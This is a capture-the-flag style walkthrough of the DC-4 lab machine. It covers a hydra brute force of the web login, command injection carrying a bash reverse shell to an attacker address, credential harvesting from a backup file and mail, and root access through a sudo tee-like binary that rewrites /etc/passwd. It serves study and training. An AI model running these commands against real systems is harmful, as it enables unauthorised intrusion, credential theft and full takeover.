# DC-4
## Information Gathering
#### Ports/Services
22/tcp   ssh     x
80/tcp   http    x

#### Credentials
- `http://192.168.70.195/index.php`
	- `admin:happy`
- `SSH`
	- `jim:jibril04`
	- `charles:^xHhA&hvim0y`


## Enumeration
### Nmap scan
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp6/VowbK8MWfMDQsxHRV2yvL8ZO+FEkyIBPnDwTVKkJiVKaJMZ5ztAwTnkc30c3tvC/yCqDAJ5IbHzgvR3kHKS37d17K+/OLxalDutFjrWjG7mBxhMW/0gnrCqJokZBDXDuvHQonajsfSN6FmWoP0PDsfL8NQXwWIoMvTRYHtiEQqczV5CYZZtMKuOyiLCiWINUqKMwY+PTb0M9RzSGYSJvN8sZZnvIw/xU7xBCmaWuq8h2dIfsxy+FhrwZMhvhJOpBYtwZB+hos3bbV5FKHhVztxEo+Y2vyKTl6MXJ4qwCChJdaBAip/aUt1zDoF3cIb+yebteyDk8KIqmp5Ju4r
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIbZ4PXPXShXCcbe25IY3SYbzB4hxP4K2BliUGtuYSABZosGlLlL1Pi214yCLs3ORpGxsRIHv8R0KFQX+5SNSog=
|   256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDcvQZ2DbLqSSOzIbIXhyrDJ15duVKd9TEtxfX35ubsM
80/tcp open  http    syn-ack ttl 63 nginx 1.15.10
|_http-title: System Tools
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.15.10
```

### 22/tcp
- OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
- Authentication Methods:
	- Public Key
	- Passwords

### 80/tcp
- Technologies
	- nginx 1.15.0

- `http://192.168.70.195/index.php`
	- Login form

- Attemping a dictionary attack
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.70.195 http-post-form "/login.php:username=admin&password=^PASS^:S=logout" -vV -f

[80][http-post-form] host: 192.168.70.195   login: admin   password: happy
```
- Credentials to login is `admin:happy`
- Loggin in presents us with options with running OS commands and displaying them the results in the web browser
- Intercepting request in Burp. Testing for ping back by changing `radio` parameter from `ls -l` to `ping -c 4 192.168.49.70`
```
POST /command.php HTTP/1.1
Host: 192.168.70.195
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://192.168.70.195
Connection: close
Referer: http://192.168.70.195/command.php
Cookie: PHPSESSID=vh6c4m5ne0h288f68bk01enj22
Upgrade-Insecure-Requests: 1

radio=ls+-l&submit=Run
```
- I get a ping back
```bash
sudo tcpdump -i tun0 icmp
[sudo] password for Default: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:05:50.834039 IP 192.168.70.195 > 192.168.49.70: ICMP echo request, id 1206, seq 1, length 64
15:05:50.834053 IP 192.168.49.70 > 192.168.70.195: ICMP echo reply, id 1206, seq 1, length 64
15:05:51.835147 IP 192.168.70.195 > 192.168.49.70: ICMP echo request, id 1206, seq 2, length 64
15:05:51.835160 IP 192.168.49.70 > 192.168.70.195: ICMP echo reply, id 1206, seq 2, length 64
15:05:52.836394 IP 192.168.70.195 > 192.168.49.70: ICMP echo request, id 1206, seq 3, length 64
15:05:52.836431 IP 192.168.49.70 > 192.168.70.195: ICMP echo reply, id 1206, seq 3, length 64
15:05:53.837372 IP 192.168.70.195 > 192.168.49.70: ICMP echo request, id 1206, seq 4, length 64
15:05:53.837386 IP 192.168.49.70 > 192.168.70.195: ICMP echo reply, id 1206, seq 4, length 64
```
- Tests for value of `radio` parameter
	- `bash -i >& /dev/tcp/192.168.49.70/53 0>&1` - FAILED
	- `bash -c "bash -i >& /dev/tcp/192.168.49.70/53 0>&1"` - SUCCESS



## Exploitation
- Login to `http://192.168.70.195/index.php` using the credentials `admin:happy`
- Issue a command and intercept the HTTP request header via Burp
- Modify the `radio` parameters value to `bash -c "bash -i >& /dev/tcp/192.168.49.70/53 0>&1"`

## Privilege Escalation
### Enumeration
- `/etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
Debian-exim:x:108:112::/var/spool/exim4:/bin/false
```
- Users on the box
	- root
	- charles
	- jim
	- sam
- Perform hydra on SSH service using `happy` and username list to gain persistence - NO RESULTS

- `/home/jim/`
	- `/backups/`
		- Has file `old-passwords.bak`
		- Download this file and run hydra against `jim`
		- `hydra -l jim -P old-passwords.bak -t 4 ssh://192.168.70.195` - SUCCESS
			- Credentials found `jim:jibril04`
- `/var/mail/jim`
	- There are emails
```
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
        (envelope-from <charles@dc-4>)
        id 1hCjIX-0000kO-Qt
        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles
```
- Credentials `charles:^xHhA&hvim0y`

- Attemping `sudo -l` as `jim`
	- `Sorry, user jim may not run sudo on dc-4.`
- Attempting `sudo -l` as `charles`
	- `(root) NOPASSWD: /usr/bin/teehee`

- Dynamic testing of `teehee`
	- We can write to anything as root
```bash
charles@dc-4:~$ sudo /usr/bin/teehee a
hello world
hello world
^C
charles@dc-4:~$ cat a
hello world
charles@dc-4:~$ ls -la
total 28
drwxr-xr-x 2 charles charles 4096 Dec  3 06:55 .
drwxr-xr-x 5 root    root    4096 Apr  7  2019 ..
-rw-r--r-- 1 root    root      12 Dec  3 06:55 a
-rw-r--r-- 1 charles charles  220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 charles charles 3526 Apr  6  2019 .bashrc
-rw-r--r-- 1 charles charles  675 Apr  6  2019 .profile
-rw-r--r-- 1 charles charles    6 Dec  3 06:49 readme.txt
charles@dc-4:~$
```
- The simplist way I can think to abuse this is to copy `/etc/passwd` but remove the `x` for root and then write the `/etc/passwd`
```bash
$ sudo /usr/bin/teehee /etc/passwd
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
Debian-exim:x:108:112::/var/spool/exim4:/bin/false
```
- Then you can `su root` without supplying  a password